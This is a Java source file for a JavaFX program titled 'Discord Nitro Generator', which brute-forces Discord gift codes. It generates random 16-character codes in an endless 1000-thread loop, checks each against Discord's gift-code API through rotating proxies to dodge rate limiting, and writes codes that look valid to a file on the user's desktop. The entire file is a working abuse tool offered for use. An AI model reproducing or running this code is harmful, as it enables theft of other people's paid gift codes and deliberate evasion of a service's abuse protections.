package ru.nordia.dsnitro;

import javafx.application.Application;
import javafx.scene.Scene;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.apache.http.HttpHost;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.AnsiConsole;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.*;

public class Main extends Application {
    private static String dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static List<String> proxies;
    private static FileWriter writer;

    @Override
    public void start(Stage primaryStage) {
        primaryStage.setTitle("Discord Nitro Generator by Nordia#9573");
        primaryStage.setOpacity(0);
        primaryStage.setIconified(true);
        primaryStage.setOnShown(e -> {
            FileChooser fileChooser = new FileChooser();
            fileChooser.setTitle("Выбрать прокси");

            begin(fileChooser.showOpenDialog(primaryStage));
        });
        primaryStage.show();
    }

    private static void begin(File proxy) {
        if (proxy == null) System.exit(1);

        try {
            proxies = FileUtils.readLines(proxy, StandardCharsets.UTF_8);
        } catch (IOException e) {
            System.exit(1);
        }

        if (proxies.isEmpty() || !proxies.stream().allMatch(p -> p.matches("([0-9]*(\\.)?)*:[0-9]*"))) System.exit(1);

        AnsiConsole.systemInstall();

        try {
             writer = new FileWriter(new File(System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "valid.txt"), true);
        } catch (IOException e) {
            System.exit(1);
        }

        Executor executor = new ThreadPoolExecutor(1000, 1000, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>(1000), new ThreadPoolExecutor.CallerRunsPolicy());

        while (true) {
            executor.execute(() -> {
                String code = getCode();

                JSONObject response;

                try {
                    response = sendRequest(proxies.get(ThreadLocalRandom.current().nextInt(proxies.size())).split(":"), code);
                } catch (IOException | ParseException e) {
                    return;
                }

                String message = (String) response.get("message");

                if (!message.equals("Unknown Gift Code") && !message.equals("service not exists") && !message.equals("You are being rate limited.")) {
                    try {
                        writer.append(code).append("\n");

                        System.out.println(Ansi.ansi().fgGreen().a(code));

                        writer.flush();
                    } catch (IOException ignored) {
                    }
                } else {
                    System.out.println(Ansi.ansi().fgRed().a(code));
                }
            });
        }
    }

    public static JSONObject sendRequest(String[] proxy, String code) throws IOException, ParseException {
        CloseableHttpClient client = HttpClients.custom()
                .setProxy(new HttpHost(proxy[0], Integer.parseInt(proxy[1])))
                .build();

        CloseableHttpResponse response = client.execute(new HttpGet("https://discord.com/api/v6/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true"));

        JSONObject object = (JSONObject) new JSONParser().parse(String.join("", IOUtils.readLines(response.getEntity().getContent())));

        client.close();
        response.close();

        return object;
    }

    private static String getCode() {
        StringBuilder builder = new StringBuilder();

        for (int i = 0; i < 16; i++) {
            builder.append(dict.charAt(ThreadLocalRandom.current().nextInt(dict.length())));
        }

        return builder.toString();
    }

    public static void main(String[] args) {
        Runtime.getRuntime().addShutdownHook(new Thread(AnsiConsole::systemUninstall));

        java.util.logging.Logger.getLogger("org.apache.http.wire").setLevel(java.util.logging.Level.FINEST);
        java.util.logging.Logger.getLogger("org.apache.http.headers").setLevel(java.util.logging.Level.FINEST);
        System.setProperty("org.apache.commons.logging.Log", "org.apache.commons.logging.impl.SimpleLog");
        System.setProperty("org.apache.commons.logging.simplelog.showdatetime", "true");
        System.setProperty("org.apache.commons.logging.simplelog.log.httpclient.wire", "ERROR");
        System.setProperty("org.apache.commons.logging.simplelog.log.org.apache.http", "ERROR");
        System.setProperty("org.apache.commons.logging.simplelog.log.org.apache.http.headers", "ERROR");

        launch();
    }
}
